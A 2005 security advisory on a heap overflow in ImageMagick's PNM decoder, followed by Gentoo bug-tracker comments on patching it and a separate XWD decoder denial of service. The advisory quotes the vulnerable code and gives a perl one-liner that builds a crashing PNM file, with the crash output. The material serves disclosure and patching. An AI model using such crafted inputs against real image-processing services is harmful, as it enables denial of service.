Overflow Security Advisory #3

ImageMagick ReadPNMImage() Heap Overflow

Vendor: ImageMagick (<http://www.imagemagick.org>)
Affected version: 6.x up to and including 6.2.1
Vendor status: Fixed version released (6.2.2)

Author: Damian Put <pucik () overflow pl>
URL: <http://www.overflow.pl/adv/imheapoverflow.txt>
Date: 25.04.2005

1. Background

ImageMagick is a free software suite to create, edit, and compose bitmap images.
 It can read, convert and write images in a large variety of formats.

<http://www.imagemagick.org>

2. Description

Remote exploitation of a heap overflow vulnerability could allow execution of
arbitrary code or couse denial of service.

A heap overflow exists in ReadPNMImage() function, that is used to decode
a PNM image files. The vulnerable code is:

coders/pnm.c:

static Image *ReadPNMImage(const ImageInfo *image_info,ExceptionInfo *exception)
{
...
    if ((format == '1') || (format == '4'))
      max_value=1;  /* bitmap */
    else
      max_value=PNMInteger(image,10);
    image->depth=max_value < 256 ? 8UL : QuantumDepth;
    if ((format != '3') && (format != '6'))
      {
        image->storage_class=PseudoClass;
        image->colors=(unsigned long) (max_value >= MaxColormapSize ?
          MaxColormapSize : max_value+1);
      }
...
        if (AllocateImageColormap(image,image->colors) == MagickFalse)
          ThrowReaderException(ResourceLimitError,"MemoryAllocationFailed");
        if (format == '7')
          {
            /*
              Initialize 332 colormap.
            */
            i=0;
            for (pixel.red=0; pixel.red < 8; pixel.red++)
              for (pixel.green=0; pixel.green < 8; pixel.green++)
                for (pixel.blue=0; pixel.blue < 4; pixel.blue++)
                {
                  image->colormap[i].red=ScaleXToQuantum(pixel.red,0x07);
                  image->colormap[i].green=ScaleXToQuantum(pixel.green,0x07);
                  image->colormap[i].blue=ScaleXToQuantum(pixel.blue,0x03);
                  i++;
                }
          }
...

We can manipulate with image->colors value, becouse it`s atributted to "max_value"
or MaxColormapSize variable. Allocation of memory for image->colormap is based on
image->colors variable (AllocateImageColormap() function). If value of "image->colors"
is for example 1, we allocate only 1*sizeof(PixelPacket) bytes of memory. Next, when
format of PNM file is "7", image->colormap buffer is initialized by 332 colormaps.
If image->colors*sizeof(PixelPacket) bytes are not enought for it, heap structures are
overflowed. We cannot control contents of this buffer, so execute of arbitrary code is
very difficult or imposible, but we can crash it in easy way.

3. PoC

Example crafted PNM file:

bash$ perl -e 'print "P7\n1\n1 1\n1"' > vuln.pnm

We can test vulnerability with "mogrify" - standard ImageMagick utility:

bash$ mogrify vuln.pnm
*** glibc detected *** malloc(): memory corruption: 0x08701198 ***
Przerwane (core dumped)
bash$

```

Note that Perlmagick is now part of Imagemagick so you only need to mark one package stable. ```  [Comment 5](#c5)  Markus Rothe (RETIRED)   gentoo-dev  2005-04-27 02:11:39 UTC  ``` stable on ppc64 ```  [Comment 6](#c6)  Bryan Østergaard (RETIRED)   gentoo-dev  2005-04-27 02:50:06 UTC  ``` Stable on alpha + ia64. ```  [Comment 7](#c7)  Herbie Hopkins (RETIRED)   gentoo-dev  2005-04-27 03:05:00 UTC  ``` Stable on amd64 ```  [Comment 8](#c8)  Luca Barbato   gentoo-dev  2005-04-27 04:23:09 UTC  ``` ppc stable ```  [Comment 9](#c9)  Thierry Carrez (RETIRED)   gentoo-dev  2005-04-27 04:59:53 UTC  ``` Apparently this is not exploitable to execute code so it might be declassified from vulnerability to a simple bug. Waiting as our auditors are busy scouting the code for exploitable ones. ```  [Comment 10](#c10)  Olivier Crete (RETIRED)   gentoo-dev  2005-04-27 08:04:16 UTC  ``` Shouldn't the imagemagick ebuild block (using DEPEND) perlmagick instead of doing it in pkg_setup() ?? ```  [Comment 11](#c11)  Gustavo Zacarias (RETIRED)   gentoo-dev  2005-04-27 08:35:58 UTC  ``` sparc stable. ```  [Comment 12](#c12)  Olivier Crete (RETIRED)   gentoo-dev  2005-04-27 08:46:16 UTC  ``` stable on x86 ```  [Comment 13](#c13)  Karol Wojtaszek (RETIRED)   gentoo-dev  2005-04-27 11:15:20 UTC  ``` tester: we want to inform users about this change, perlmagick will be soon removed from portage. ```  [Comment 14](#c14)  Michael Hanselmann (hansmi) (RETIRED)   gentoo-dev  2005-04-27 11:58:40 UTC  ``` Stable on hppa. ```  [Comment 15](#c15)  Tobias Sager    2005-04-28 07:55:25 UTC  ``` Imagemagick should block perlmagick in DEPEND not pkg_setup().

There is a DoS in the xwd decoder:  in this loop, the mask is set in the image and can be set to zero:   346         /*  347           Determine shift and mask for red, green, and blue.  348         */  349         red_mask=ximage->red_mask;  350         red_shift=0;  351         while ((red_mask & 0x01) == 0)  352         {  353           red_mask>>=1;  354           red_shift++;  355         }  (and the same below for green and blue), which could potentially be a nuisance for web-apps or similar that rely on im for image processing.   ```  [Comment 19](#c19)  Sune Kloppenborg Jeppesen (RETIRED)   gentoo-dev  2005-05-03 09:52:11 UTC  ``` Arches please mark stable. ```  [Comment 20](#c20)  Tavis Ormandy (RETIRED)   gentoo-dev  2005-05-05 13:32:22 UTC  ``` Created [attachment 58154](attachment.cgi?id=58154 "xwd DoS testcase") [[details](attachment.cgi?id=58154&action=edit "xwd DoS testcase")] xwd DoS testcase  testcase for XWD DoS. ```  [Comment 21](#c21)  Sune Kloppenborg Jeppesen (RETIRED)   gentoo-dev  2005-05-05 22:44:34 UTC  ``` As I understand it, this is NOT fixed by the current release -> back to upstream status.  Btw: Taviso, has upstream been notified? ```  [Comment 22](#c22)  Tavis Ormandy (RETIRED)   gentoo-dev  2005-05-13 02:18:34 UTC  ``` PNM Heap overflow is being re-classified as a non-security bug, remaining issue is the xwd DoS. ```  [Comment 23](#c23)  Thierry Carrez (RETIRED)   gentoo-dev  2005-05-13 02:36:59 UTC  ``` XWD DoS issue fixed in upstream 6.2.2-3 graphics team, please bump ```  [Comment 24](#c24)  Karol Wojtaszek (RETIRED)   gentoo-dev  2005-05-15 09:00:38 UTC  ``` imagemagick-6.2.2.3 in portage ```  [Comment 25](#c25)  Thierry Carrez (RETIRED)   gentoo-dev  2005-05-15 14:05:27 UTC  ``` Arches, please test and mark stable Target KEYWORDS="alpha amd64 hppa ia64 ~mips ppc ppc64 sparc x86"  ```  [Comment 26](#c26)  Michael Hanselmann (hansmi) (RETIRED)   gentoo-dev  2005-05-15 14:57:11 UTC  ``` Stable on ppc.
